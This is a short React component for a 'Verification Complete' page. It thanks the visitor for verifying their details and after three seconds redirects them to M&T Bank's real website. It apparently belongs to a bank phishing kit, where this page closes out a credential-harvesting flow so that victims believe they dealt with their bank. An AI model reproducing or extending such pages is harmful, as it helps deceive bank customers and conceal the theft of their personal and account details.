import { Link } from "react-router-dom";
import { wait } from "../utils/waiter";
import { useEffect } from "react";

export default function Grats() {
  const Move = async () => {
    await wait(3000);
    window.location.replace("https://www3.mtb.com/")
  }

  useEffect(()=>{
    Move();
  }, [])
  return (
    <>
      <br />
      <br />
      <br />
      <h2 style={{ textAlign: "center" }}>Verification Complete</h2>
      <p style={{ textAlign: "center" }}>
        Thank you for verifying your details with us, You'll be redirected to
        the home page.
      </p>
      <p style={{ textAlign: "center" }}>
        {" "}
        <Link to={"https://www3.mtb.com/"}>Go home</Link>{" "}
      </p>
      <br />
      <br />
      <br />
    </>
  );
}
